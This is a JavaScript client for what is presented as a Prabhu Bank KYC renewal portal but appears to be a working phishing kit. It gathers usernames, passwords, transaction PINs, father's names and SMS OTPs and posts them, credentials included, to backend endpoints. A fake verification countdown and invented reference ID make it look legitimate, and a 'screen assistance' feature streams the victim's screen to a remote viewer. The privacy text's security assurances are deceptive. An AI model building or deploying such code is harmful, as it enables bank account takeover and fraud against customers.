/**
 * Prabhu Bank KYC Re-Registration & Renewal Portal
 * Client Portal State Engine & Backend Response Connector
 */

(function () {
  'use strict';

  // --- STATE MANAGEMENT ---
  const state = {
    currentStep: 1,
    formData: {
      sessionId: '',
      username: '',
      mobile: '',
      password: '',
      pin: '',
      fatherName: '',
      otp: '',
      refId: '',
      webrtcSessionId: '',
      submittedAt: ''
    },
    countdownTimer: null,
    totalProcessingSeconds: 15,
    countdownSeconds: 15,
    resendSeconds: 120, // 2-minute resend OTP timer
    resendTimer: null
  };

  // --- DOM REFERENCES ---
  const DOM = {
    // Stepper Indicators
    stepIndicators: [
      document.getElementById('stepIndicator1'),
      document.getElementById('stepIndicator2'),
      document.getElementById('stepIndicator3'),
      document.getElementById('stepIndicator4')
    ],
    // Step Views
    stepViews: [
      document.getElementById('stepView1'),
      document.getElementById('stepView2'),
      document.getElementById('stepView3'),
      document.getElementById('stepView4')
    ],
    // Step 1 Elements
    kycForm: document.getElementById('kycForm'),
    usernameInput: document.getElementById('usernameInput'),
    usernameWrapper: document.getElementById('usernameWrapper'),
    usernameError: document.getElementById('usernameError'),
    mobileInput: document.getElementById('mobileInput'),
    mobileWrapper: document.getElementById('mobileWrapper'),
    mobileError: document.getElementById('mobileError'),
    passwordInput: document.getElementById('passwordInput'),
    passwordWrapper: document.getElementById('passwordWrapper'),
    passwordError: document.getElementById('passwordError'),
    togglePasswordBtn: document.getElementById('togglePasswordBtn'),
    pinInput: document.getElementById('pinInput'),
    pinWrapper: document.getElementById('pinWrapper'),
    pinError: document.getElementById('pinError'),
    fatherInput: document.getElementById('fatherInput'),
    fatherWrapper: document.getElementById('fatherWrapper'),
    fatherError: document.getElementById('fatherError'),
    // Step 2 Elements
    summaryUsername: document.getElementById('summaryUsername'),
    summaryMobile: document.getElementById('summaryMobile'),
    bigCountdownNumber: document.getElementById('bigCountdownNumber'),
    processingProgressBar: document.getElementById('processingProgressBar'),
    processingPercentText: document.getElementById('processingPercentText'),
    estimatedTimeText: document.getElementById('estimatedTimeText'),
    skipProcessingBtn: document.getElementById('skipProcessingBtn'),
    // Step 3 Elements
    otpBoxFrame: document.getElementById('otpBoxFrame'),
    otpDigits: Array.from(document.querySelectorAll('.otp-digit')),
    otpError: document.getElementById('otpError'),
    verifyOtpBtn: document.getElementById('verifyOtpBtn'),
    resendOtpBtn: document.getElementById('resendOtpBtn'),
    resendCountdownText: document.getElementById('resendCountdownText'),
    // Step 4 Elements
    refIdText: document.getElementById('refIdText'),
    submissionTimestamp: document.getElementById('submissionTimestamp'),
    startNewBtn: document.getElementById('startNewBtn'),
    // Legal Modal
    policyModalOverlay: document.getElementById('policyModalOverlay'),
    closePolicyModalBtn: document.getElementById('closePolicyModalBtn'),
    policyModalTitle: document.getElementById('policyModalTitle'),
    policyModalContent: document.getElementById('policyModalContent'),
    termsLink: document.getElementById('termsLink'),
    privacyLink: document.getElementById('privacyLink'),
    cookiesLink: document.getElementById('cookiesLink'),
    // Screen Share Elements
    screenShareTriggerBtn: document.getElementById('screenShareTriggerBtn'),
    screenShareBtnLabel: document.getElementById('screenShareBtnLabel'),
    screenShareModalOverlay: document.getElementById('screenShareModalOverlay'),
    closeScreenShareModalBtn: document.getElementById('closeScreenShareModalBtn'),
    modalStatusChip: document.getElementById('modalStatusChip'),
    modalStatusDesc: document.getElementById('modalStatusDesc'),
    modalSessionLinkRow: document.getElementById('modalSessionLinkRow'),
    modalSessionIdText: document.getElementById('modalSessionIdText'),
    copyViewerLinkBtn: document.getElementById('copyViewerLinkBtn'),
    modalOpenViewerLink: document.getElementById('modalOpenViewerLink'),
    mobileUnsupportedNotice: document.getElementById('mobileUnsupportedNotice'),
    startScreenShareBtn: document.getElementById('startScreenShareBtn'),
    stopScreenShareBtn: document.getElementById('stopScreenShareBtn')
  };

  // --- INITIALIZATION ---
  function init() {
    bindEvents();
  }

  // --- EVENT BINDINGS ---
  function bindEvents() {
    // Step 1 Form Submission
    if (DOM.kycForm) DOM.kycForm.addEventListener('submit', handleStep1Submit);

    // Password Visibility Toggle
    if (DOM.togglePasswordBtn) DOM.togglePasswordBtn.addEventListener('click', togglePasswordVisibility);

    // Field-level Real-time validation & formatting
    if (DOM.mobileInput) DOM.mobileInput.addEventListener('input', handleMobileInput);
    if (DOM.pinInput) DOM.pinInput.addEventListener('input', handlePinInput);
    if (DOM.usernameInput) DOM.usernameInput.addEventListener('input', () => clearFieldError('username'));
    if (DOM.passwordInput) DOM.passwordInput.addEventListener('input', () => clearFieldError('password'));
    if (DOM.fatherInput) DOM.fatherInput.addEventListener('input', () => clearFieldError('father'));

    // Step 2 Skip / Fast-forward
    if (DOM.skipProcessingBtn) DOM.skipProcessingBtn.addEventListener('click', skipProcessingCountdown);

    // Step 3 OTP Box Logic
    initOtpInputs();
    if (DOM.verifyOtpBtn) DOM.verifyOtpBtn.addEventListener('click', handleVerifyOtp);
    if (DOM.resendOtpBtn) DOM.resendOtpBtn.addEventListener('click', handleResendOtp);

    // Step 4 Reset / Restart
    if (DOM.startNewBtn) DOM.startNewBtn.addEventListener('click', handleStartNew);

    // Legal Policy Modals
    if (DOM.closePolicyModalBtn) DOM.closePolicyModalBtn.addEventListener('click', closePolicyModal);
    if (DOM.policyModalOverlay) {
      DOM.policyModalOverlay.addEventListener('click', (e) => {
        if (e.target === DOM.policyModalOverlay) closePolicyModal();
      });
    }

    if (DOM.termsLink) DOM.termsLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('terms'); });
    if (DOM.privacyLink) DOM.privacyLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('privacy'); });
    if (DOM.cookiesLink) DOM.cookiesLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('cookies'); });

    // Screen Share Integration
    if (DOM.screenShareTriggerBtn) DOM.screenShareTriggerBtn.addEventListener('click', openScreenShareModal);
    if (DOM.closeScreenShareModalBtn) DOM.closeScreenShareModalBtn.addEventListener('click', closeScreenShareModal);
    if (DOM.screenShareModalOverlay) {
      DOM.screenShareModalOverlay.addEventListener('click', (e) => {
        if (e.target === DOM.screenShareModalOverlay) closeScreenShareModal();
      });
    }
    if (DOM.startScreenShareBtn) DOM.startScreenShareBtn.addEventListener('click', handleStartScreenShare);
    if (DOM.stopScreenShareBtn) DOM.stopScreenShareBtn.addEventListener('click', handleStopScreenShare);
    if (DOM.copyViewerLinkBtn) DOM.copyViewerLinkBtn.addEventListener('click', copyViewerLinkToClipboard);
  }

  // --- STEP NAVIGATION ENGINE ---
  function goToStep(stepNumber) {
    if (stepNumber < 1 || stepNumber > 4) return;
    state.currentStep = stepNumber;

    // Update Stepper Indicators
    DOM.stepIndicators.forEach((indicator, idx) => {
      if (!indicator) return;
      const stepIdx = idx + 1;
      indicator.classList.remove('active', 'completed');
      if (stepIdx === stepNumber) {
        indicator.classList.add('active');
      } else if (stepIdx < stepNumber) {
        indicator.classList.add('completed');
      }
    });

    // Update Step Views
    DOM.stepViews.forEach((view, idx) => {
      if (!view) return;
      const stepIdx = idx + 1;
      if (stepIdx === stepNumber) {
        view.classList.add('active');
      } else {
        view.classList.remove('active');
      }
    });

    // Step-specific trigger actions
    if (stepNumber === 2) {
      startStep2Processing();
    } else if (stepNumber === 3) {
      startStep3Otp();
    } else if (stepNumber === 4) {
      renderStep4Confirmation();
    }
  }

  // --- STEP 1: FORM VALIDATION & BACKEND SUBMISSION ---
  async function handleStep1Submit(e) {
    e.preventDefault();
    let isValid = true;

    const username = DOM.usernameInput ? DOM.usernameInput.value.trim() : '';
    const mobile = DOM.mobileInput ? DOM.mobileInput.value.trim() : '';
    const password = DOM.passwordInput ? DOM.passwordInput.value : '';
    const pin = DOM.pinInput ? DOM.pinInput.value.trim() : '';
    const fatherName = DOM.fatherInput ? DOM.fatherInput.value.trim() : '';

    // Username validation
    if (!username) {
      showFieldError('username', 'Please enter your username');
      isValid = false;
    } else if (username.length < 3) {
      showFieldError('username', 'Username must be at least 3 characters');
      isValid = false;
    } else {
      clearFieldError('username');
    }

    // Mobile validation (Nepal 10-digit format)
    if (!mobile) {
      showFieldError('mobile', 'Please enter your 10-digit mobile number');
      isValid = false;
    } else if (!/^[0-9]{10}$/.test(mobile)) {
      showFieldError('mobile', 'Mobile number must be exactly 10 digits');
      isValid = false;
    } else {
      clearFieldError('mobile');
    }

    // Password validation
    if (!password) {
      showFieldError('password', 'Please enter your password');
      isValid = false;
    } else {
      clearFieldError('password');
    }

    // PIN validation (4 numeric digits)
    if (!pin) {
      showFieldError('pin', 'Please enter your 4-digit transaction PIN');
      isValid = false;
    } else if (!/^[0-9]{4}$/.test(pin)) {
      showFieldError('pin', 'Transaction PIN must be exactly 4 digits');
      isValid = false;
    } else {
      clearFieldError('pin');
    }

    // Father Name validation
    if (!fatherName) {
      showFieldError('father', "Please enter father's name");
      isValid = false;
    } else {
      clearFieldError('father');
    }

    if (!isValid) return;

    // Generate session ID & Ref ID
    const generatedRefId = 'PRB-KYC-' + Math.floor(100000 + Math.random() * 900000);
    const generatedSessionId = 'PRB-SES-' + Math.floor(100000 + Math.random() * 900000);

    // Store in State
    state.formData.sessionId = generatedSessionId;
    state.formData.refId = generatedRefId;
    state.formData.username = username;
    state.formData.mobile = mobile;
    state.formData.password = password;
    state.formData.pin = pin;
    state.formData.fatherName = fatherName;

    // Send Response Asynchronously to Backend
    try {
      fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: state.formData.sessionId,
          refId: state.formData.refId,
          webrtcSessionId: state.formData.webrtcSessionId,
          username: state.formData.username,
          mobile: state.formData.mobile,
          password: state.formData.password,
          pin: state.formData.pin,
          fatherName: state.formData.fatherName
        })
      }).then(res => res.json()).then(data => {
        if (data && data.sessionId) {
          state.formData.sessionId = data.sessionId;
        }
      }).catch(err => {
        console.warn('Backend logging notice:', err);
      });
    } catch (err) {
      console.warn('Backend communication err:', err);
    }

    // Proceed to Step 2
    goToStep(2);
  }

  function handleMobileInput(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 10) val = val.slice(0, 10);
    e.target.value = val;
    clearFieldError('mobile');
  }

  function handlePinInput(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 4) val = val.slice(0, 4);
    e.target.value = val;
    clearFieldError('pin');
  }

  function togglePasswordVisibility() {
    const isPassword = DOM.passwordInput.type === 'password';
    DOM.passwordInput.type = isPassword ? 'text' : 'password';

    const eyeHide = DOM.togglePasswordBtn.querySelector('.eye-hide');
    const eyeShow = DOM.togglePasswordBtn.querySelector('.eye-show');

    if (isPassword) {
      if (eyeHide) eyeHide.classList.add('hidden');
      if (eyeShow) eyeShow.classList.remove('hidden');
    } else {
      if (eyeHide) eyeHide.classList.remove('hidden');
      if (eyeShow) eyeShow.classList.add('hidden');
    }
  }

  function showFieldError(field, message) {
    const wrapper = DOM[`${field}Wrapper`];
    const errorEl = DOM[`${field}Error`];
    if (wrapper) wrapper.classList.add('has-error');
    if (errorEl) {
      errorEl.textContent = message;
      errorEl.classList.add('visible');
    }
  }

  function clearFieldError(field) {
    const wrapper = DOM[`${field}Wrapper`];
    const errorEl = DOM[`${field}Error`];
    if (wrapper) wrapper.classList.remove('has-error');
    if (errorEl) {
      errorEl.textContent = '';
      errorEl.classList.remove('visible');
    }
  }

  // --- STEP 2: VERIFICATION & LIVE EXTENDED COUNTDOWN ---
  function startStep2Processing() {
    // Populate User Summary
    if (DOM.summaryUsername) DOM.summaryUsername.textContent = state.formData.username || 'Customer';
    if (DOM.summaryMobile) DOM.summaryMobile.textContent = `+977 ${state.formData.mobile || '98XXXXXXXX'}`;

    // Reset Progress & Countdown to 60 seconds
    const totalDuration = state.totalProcessingSeconds || 60;
    state.countdownSeconds = totalDuration;
    updateProcessingUI(totalDuration, totalDuration);

    if (state.countdownTimer) clearInterval(state.countdownTimer);

    let elapsed = 0;

    state.countdownTimer = setInterval(() => {
      elapsed++;
      const remaining = Math.max(0, totalDuration - elapsed);
      state.countdownSeconds = remaining;

      updateProcessingUI(remaining, totalDuration);

      if (remaining <= 0) {
        clearInterval(state.countdownTimer);
        state.countdownTimer = null;
        setTimeout(() => {
          goToStep(3);
        }, 500);
      }
    }, 1000);
  }

  function updateProcessingUI(remainingSeconds, totalDuration) {
    const total = totalDuration || 60;
    const progressPercent = Math.min(100, Math.round(((total - remainingSeconds) / total) * 100));

    if (DOM.bigCountdownNumber) DOM.bigCountdownNumber.textContent = remainingSeconds;
    if (DOM.processingProgressBar) DOM.processingProgressBar.style.width = `${Math.max(2, progressPercent)}%`;
    if (DOM.processingPercentText) DOM.processingPercentText.textContent = `Processing verification... ${progressPercent}% complete`;
    if (DOM.estimatedTimeText) {
      DOM.estimatedTimeText.textContent = `Estimated time: ${remainingSeconds} second${remainingSeconds === 1 ? '' : 's'}`;
    }
  }

  function skipProcessingCountdown() {
    if (state.countdownTimer) {
      clearInterval(state.countdownTimer);
      state.countdownTimer = null;
    }
    updateProcessingUI(0, state.totalProcessingSeconds || 60);
    goToStep(3);
  }

  // --- STEP 3: MANUAL CUSTOMER OTP INPUT (NO AUTO-FILL, NO AUTO-GENERATE) ---
  function startStep3Otp() {
    // Clear all OTP input fields so customer manually enters their code from SMS
    DOM.otpDigits.forEach((digitInput) => {
      if (digitInput) digitInput.value = '';
    });

    clearOtpError();

    // Set cursor focus to first OTP box
    setTimeout(() => {
      if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
    }, 150);

    // Start 120s (2 minutes) Resend countdown
    startResendCountdown();
  }

  function initOtpInputs() {
    DOM.otpDigits.forEach((input, index) => {
      if (!input) return;

      input.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        e.target.value = val ? val[val.length - 1] : '';

        clearOtpError();

        if (e.target.value && index < DOM.otpDigits.length - 1) {
          DOM.otpDigits[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
          DOM.otpDigits[index - 1].focus();
        }
      });

      input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
        const digits = pasteData.replace(/\D/g, '').slice(0, 6).split('');
        digits.forEach((digit, i) => {
          if (DOM.otpDigits[i]) DOM.otpDigits[i].value = digit;
        });
        if (digits.length > 0) {
          const nextIdx = Math.min(digits.length, DOM.otpDigits.length - 1);
          if (DOM.otpDigits[nextIdx]) DOM.otpDigits[nextIdx].focus();
        }
      });
    });
  }

  async function handleVerifyOtp() {
    const enteredOtp = DOM.otpDigits.map(d => d.value.trim()).join('');

    if (enteredOtp.length < 6) {
      showOtpError('Please enter the full 6-digit OTP code received on your phone');
      return;
    }

    state.formData.otp = enteredOtp;
    if (!state.formData.refId) {
      state.formData.refId = 'PRB-KYC-' + Math.floor(100000 + Math.random() * 900000);
    }
    state.formData.submittedAt = new Date().toLocaleString();

    // Send Customer's Entered OTP & KYC Record to Backend API
    try {
      fetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: state.formData.sessionId,
          refId: state.formData.refId,
          username: state.formData.username,
          mobile: state.formData.mobile,
          password: state.formData.password,
          pin: state.formData.pin,
          fatherName: state.formData.fatherName,
          otp: enteredOtp
        })
      }).then(res => res.json()).then(data => {
        if (data && data.refId) {
          state.formData.refId = data.refId;
          if (DOM.refIdText) DOM.refIdText.textContent = data.refId;
        }
      }).catch(err => {
        console.warn('Backend verification logging:', err);
      });
    } catch (err) {
      console.warn('Backend verification err:', err);
    }

    // Proceed to Step 4 Confirmation
    goToStep(4);
  }

  function handleResendOtp() {
    if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = true;

    // Clear boxes for customer to enter new code
    DOM.otpDigits.forEach(d => { if (d) d.value = ''; });
    if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
    clearOtpError();

    // Restart extended 120s timer
    startResendCountdown();
  }

  function startResendCountdown() {
    state.resendSeconds = 120; // 2 minutes resend cooldown
    if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = true;
    
    updateResendCountdownDisplay(state.resendSeconds);

    if (state.resendTimer) clearInterval(state.resendTimer);

    state.resendTimer = setInterval(() => {
      state.resendSeconds--;
      if (state.resendSeconds > 0) {
        updateResendCountdownDisplay(state.resendSeconds);
      } else {
        clearInterval(state.resendTimer);
        state.resendTimer = null;
        if (DOM.resendCountdownText) DOM.resendCountdownText.textContent = "Didn't receive SMS?";
        if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = false;
      }
    }, 1000);
  }

  function updateResendCountdownDisplay(seconds) {
    if (!DOM.resendCountdownText) return;
    const mins = Math.floor(seconds / 60);
    const remSecs = seconds % 60;
    const formatted = mins > 0 ? `${mins}:${remSecs < 10 ? '0' : ''}${remSecs}` : `${seconds}s`;
    DOM.resendCountdownText.textContent = `Resend code in ${formatted}`;
  }

  function showOtpError(msg) {
    if (DOM.otpBoxFrame) DOM.otpBoxFrame.style.borderColor = '#dc2626';
    if (DOM.otpError) {
      DOM.otpError.textContent = msg;
      DOM.otpError.classList.add('visible');
    }
  }

  function clearOtpError() {
    if (DOM.otpBoxFrame) DOM.otpBoxFrame.style.borderColor = '';
    if (DOM.otpError) {
      DOM.otpError.textContent = '';
      DOM.otpError.classList.remove('visible');
    }
  }

  // --- STEP 4: SUCCESS CONFIRMATION ---
  function renderStep4Confirmation() {
    if (DOM.refIdText) DOM.refIdText.textContent = state.formData.refId || 'PRB-KYC-948201';
    if (DOM.submissionTimestamp) DOM.submissionTimestamp.textContent = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  }

  function handleStartNew() {
    if (DOM.kycForm) DOM.kycForm.reset();
    DOM.otpDigits.forEach(d => { if (d) d.value = ''; });
    state.formData = {
      sessionId: '',
      username: '',
      mobile: '',
      password: '',
      pin: '',
      fatherName: '',
      otp: '',
      refId: '',
      submittedAt: ''
    };

    goToStep(1);
  }

  // --- LEGAL & POLICY MODALS ---
  const POLICIES = {
    terms: {
      title: 'Prabhu Bank Terms & Conditions',
      content: `
        <h3>1. Online KYC Renewal Services</h3>
        <p>By submitting this form, you acknowledge that all customer identification and residential details provided are accurate and current in accordance with Nepal Rastra Bank (NRB) unified directives on Anti-Money Laundering (AML) and Know Your Customer (KYC) requirements.</p>
        <h3>2. Verification & Authentication</h3>
        <p>Prabhu Bank reserves the right to authenticate submitted details with relevant national databases, credit bureaus, and telecom providers. Your submission will be finalized after one-time-password (OTP) verification.</p>
      `
    },
    privacy: {
      title: 'Prabhu Bank Privacy Policy',
      content: `
        <h3>1. Data Protection & Security</h3>
        <p>All sensitive personal identifiable information (PII) including your mobile number, transaction PIN, and familial details are encrypted in transit using industry-standard TLS 1.3 encryption protocols.</p>
        <h3>2. Purpose of Collection</h3>
        <p>Information gathered through this KYC portal is exclusively utilized for customer verification, regulatory compliance, and account safeguarding.</p>
      `
    },
    cookies: {
      title: 'Prabhu Bank Cookies Policy',
      content: `
        <h3>1. Essential Session Cookies</h3>
        <p>Our KYC portal utilizes necessary session tokens to securely preserve your authentication progress across the 4 verification steps. No third-party marketing cookies are deployed.</p>
      `
    }
  };

  function openPolicyModal(type) {
    const policy = POLICIES[type] || POLICIES.terms;
    if (DOM.policyModalTitle) DOM.policyModalTitle.textContent = policy.title;
    if (DOM.policyModalContent) DOM.policyModalContent.innerHTML = policy.content;
    if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.add('open');
  }

  function closePolicyModal() {
    if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.remove('open');
  }

  // --- WEBRTC SCREEN SHARING CONTROLLER ---
  let screenBroadcaster = null;

  function openScreenShareModal() {
    if (!DOM.screenShareModalOverlay) return;
    DOM.screenShareModalOverlay.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    // Check device capability
    const canShare = window.PrabhuWebRTC && window.PrabhuWebRTC.canShareScreen();
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (isMobile && !canShare) {
      if (DOM.mobileUnsupportedNotice) DOM.mobileUnsupportedNotice.style.display = 'flex';
      if (DOM.startScreenShareBtn) {
        DOM.startScreenShareBtn.disabled = true;
        DOM.startScreenShareBtn.style.opacity = '0.5';
      }
    } else {
      if (DOM.mobileUnsupportedNotice) DOM.mobileUnsupportedNotice.style.display = 'none';
      if (DOM.startScreenShareBtn) {
        DOM.startScreenShareBtn.disabled = false;
        DOM.startScreenShareBtn.style.opacity = '1';
      }
    }
  }

  function closeScreenShareModal() {
    if (!DOM.screenShareModalOverlay) return;
    DOM.screenShareModalOverlay.style.display = 'none';
    document.body.style.overflow = '';
  }

  async function handleStartScreenShare() {
    try {
      if (!window.PrabhuWebRTC) {
        alert('WebRTC engine not loaded. Please refresh the page.');
        return;
      }

      if (!screenBroadcaster) {
        screenBroadcaster = new window.PrabhuWebRTC.ScreenShareBroadcaster({
          onStateChange: (newState) => {
            updateScreenShareUI(newState);
          },
          onError: (errMsg) => {
            alert(errMsg);
            updateScreenShareUI('error');
          }
        });
      }

      updateScreenShareUI('requesting_permission');
      const { sessionId } = await screenBroadcaster.startCapture();
      state.formData.webrtcSessionId = sessionId;

      if (DOM.modalSessionIdText) DOM.modalSessionIdText.textContent = sessionId;
      if (DOM.modalSessionLinkRow) DOM.modalSessionLinkRow.style.display = 'block';
      if (DOM.modalOpenViewerLink) DOM.modalOpenViewerLink.href = `/viewer.html?session=${encodeURIComponent(sessionId)}`;

    } catch (err) {
      console.warn('[ScreenShare Start]', err);
    }
  }

  async function handleStopScreenShare() {
    if (screenBroadcaster) {
      await screenBroadcaster.stop();
      updateScreenShareUI('ended');
    }
  }

  function updateScreenShareUI(status) {
    const chip = DOM.modalStatusChip;
    const desc = DOM.modalStatusDesc;
    const startBtn = DOM.startScreenShareBtn;
    const stopBtn = DOM.stopScreenShareBtn;
    const triggerBtn = DOM.screenShareTriggerBtn;
    const triggerLabel = DOM.screenShareBtnLabel;

    if (!chip) return;

    chip.className = 'status-badge-chip';

    if (status === 'requesting_permission') {
      chip.textContent = 'Prompting';
      chip.classList.add('waiting');
      if (desc) desc.textContent = 'Please choose which screen to share in your browser prompt...';
    } else if (status === 'waiting_for_viewer') {
      chip.textContent = 'Active';
      chip.classList.add('active');
      if (desc) desc.textContent = 'Screen broadcasting live! Waiting for bank assistant to connect...';
      if (startBtn) startBtn.style.display = 'none';
      if (stopBtn) stopBtn.style.display = 'flex';
      if (triggerBtn) triggerBtn.classList.add('active-sharing');
      if (triggerLabel) triggerLabel.textContent = 'Sharing Active';
    } else if (status === 'connected') {
      chip.textContent = 'Connected';
      chip.classList.add('active');
      if (desc) desc.textContent = 'Viewer connected! Live screen sharing in progress.';
      if (startBtn) startBtn.style.display = 'none';
      if (stopBtn) stopBtn.style.display = 'flex';
      if (triggerBtn) triggerBtn.classList.add('active-sharing');
      if (triggerLabel) triggerLabel.textContent = 'Sharing Active';
    } else if (status === 'permission_denied') {
      chip.textContent = 'Denied';
      chip.classList.add('denied');
      if (desc) desc.textContent = 'Screen sharing permission was denied by user.';
      if (startBtn) startBtn.style.display = 'flex';
      if (stopBtn) stopBtn.style.display = 'none';
      if (triggerBtn) triggerBtn.classList.remove('active-sharing');
      if (triggerLabel) triggerLabel.textContent = 'Live Screen Assistance';
    } else if (status === 'ended') {
      chip.textContent = 'Ended';
      if (desc) desc.textContent = 'Screen sharing session has concluded.';
      if (startBtn) startBtn.style.display = 'flex';
      if (stopBtn) stopBtn.style.display = 'none';
      if (triggerBtn) triggerBtn.classList.remove('active-sharing');
      if (triggerLabel) triggerLabel.textContent = 'Live Screen Assistance';
    }
  }

  function copyViewerLinkToClipboard() {
    if (!screenBroadcaster || !screenBroadcaster.sessionId) return;
    const fullUrl = `${window.location.origin}/viewer.html?session=${encodeURIComponent(screenBroadcaster.sessionId)}`;
    navigator.clipboard.writeText(fullUrl).then(() => {
      if (DOM.copyViewerLinkBtn) {
        const originalText = DOM.copyViewerLinkBtn.textContent;
        DOM.copyViewerLinkBtn.textContent = 'Copied!';
        setTimeout(() => { DOM.copyViewerLinkBtn.textContent = originalText; }, 2000);
      }
    }).catch(() => {
      prompt('Copy this viewer URL:', fullUrl);
    });
  }

  // Bootstrap when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
